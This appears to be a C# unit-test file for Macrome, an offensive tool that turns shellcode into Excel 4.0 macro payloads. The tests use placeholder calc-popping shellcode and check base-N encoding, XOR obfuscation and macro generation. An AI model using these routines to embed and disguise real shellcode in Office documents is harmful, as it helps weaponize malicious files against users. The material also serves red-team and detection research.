using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Macrome;
using Macrome.Encryption;
using NUnit.Framework;

namespace UnitTests
{
    [TestFixture]
    class PayloadGenerationTests
    {
        [SetUp]
        public void SetUp()
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        }
        
        [Test]
        public void TestGenerateMacroForPayload()
        {
            byte[] shellcode = TestHelpers.GetPopCalcShellcode();
            List<string> macros = FormulaHelper.BuildPayloadMacros(shellcode);

            Assert.AreEqual("END", macros.Last());
        }

        private byte[] XorPayloadAgainstString(byte[] shellcode, string xorKey)
        {
            for (int i = 0; i < shellcode.Length; i += 1)
            {
                int keyValue = xorKey[i % xorKey.Length];
                shellcode[i] = (byte)(shellcode[i] ^ keyValue);
            }

            return shellcode;
        }

        private List<string> ConvertPayloadToStrings(byte[] shellcode, BaseNEncoder encoder)
        {
            List<string> output = new List<string>();
            string encodedContent = "";
            for (int offset = 0; offset < shellcode.Length; offset += 16)
            {
                byte[] guidShellcode;
                if (shellcode.Length - offset < 16)
                {
                    guidShellcode = shellcode.Skip(offset).ToArray();
                    Array.Resize(ref guidShellcode, 16);
                }
                else
                {
                    guidShellcode = shellcode.Skip(offset).Take(16).ToArray();
                }

                string encodedGuid = encoder.Encode(guidShellcode);
                encodedContent += encodedGuid;
                if (encodedContent.Length > 200)
                {
                    output.Add(encodedContent);
                    encodedContent = "";
                }
            }

            if (encodedContent.Length > 0)
            {
                output.Add(encodedContent);
            }
            return output;
        }

        [Test]
        public void TestBase255EncodingForBasicPayload()
        {
            byte[] shellcode = TestHelpers.GetPopCalcShellcode();
            
            BaseNEncoder encoder = new BaseNEncoder();

            var strings = FormulaHelper.BuildBase64PayloadMacros(shellcode);
            foreach(var s in strings) {Console.WriteLine(string.Format("=\"{0}\"",s));}
            
            string encodedShellcode = encoder.Encode(shellcode);

            
            
            int encodedLen = encodedShellcode.Length;
            byte[] decodedShellcode = encoder.Decode(encodedShellcode);
            Assert.AreEqual(shellcode, decodedShellcode);
        }
        
        [Test]
        public void TestBase255EncodingForEdgeCasePayloads()
        {
            byte[] shellcode = new byte[] {0x00, 0x01, 0x02, 0x03, 0xFC, 0xFD, 0xFE, 0xFF};
            
            BaseNEncoder encoder = new BaseNEncoder();
            Console.WriteLine(encoder);
            string encodedShellcode = encoder.Encode(shellcode);
            List<int> lookups = new List<int>();
            foreach (var c in encodedShellcode)
            {
                lookups.Add((int)c);
            }
            int encodedLen = encodedShellcode.Length;
            byte[] decodedShellcode = encoder.Decode(encodedShellcode);
            Assert.AreEqual(shellcode, decodedShellcode);
        }

        [Test]
        public void TestBase255XorEncoding()
        {
            
            BaseNEncoder encoder = new BaseNEncoder();

            byte[] nullShellcode = new byte[] {0, 0, 0};
            
            string xorKey = "\x00\x00\x00";

            byte[] xoredNullShellcode = XorPayloadAgainstString(nullShellcode, xorKey);
            Assert.AreEqual(xorKey, Encoding.Default.GetString(xoredNullShellcode));
            
            byte[] shellcode = TestHelpers.GetPopCalc64Shellcode();
            shellcode = XorPayloadAgainstString(shellcode, xorKey);
            // var strings = ConvertPayloadToStrings(shellcode, encoder);
            var strings = FormulaHelper.BuildBase64PayloadMacros(shellcode);
            foreach(var s in strings) {Console.WriteLine(string.Format("=\"{0}\"",s));}
        }
    }
}
